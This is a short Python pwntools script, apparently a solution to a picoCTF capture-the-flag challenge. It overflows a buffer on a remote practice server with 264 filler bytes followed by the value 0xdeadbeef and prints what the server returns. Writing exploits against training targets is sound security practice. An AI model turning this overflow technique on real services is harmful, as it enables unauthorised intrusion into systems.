from pwn import *
#s = process("./chall")
s = remote("mars.picoctf.net", 31890)
s.recvuntil("see?\n")
s.sendline(b"A" * 264 + p64(0xdeadbeef))
print(s.recvall())
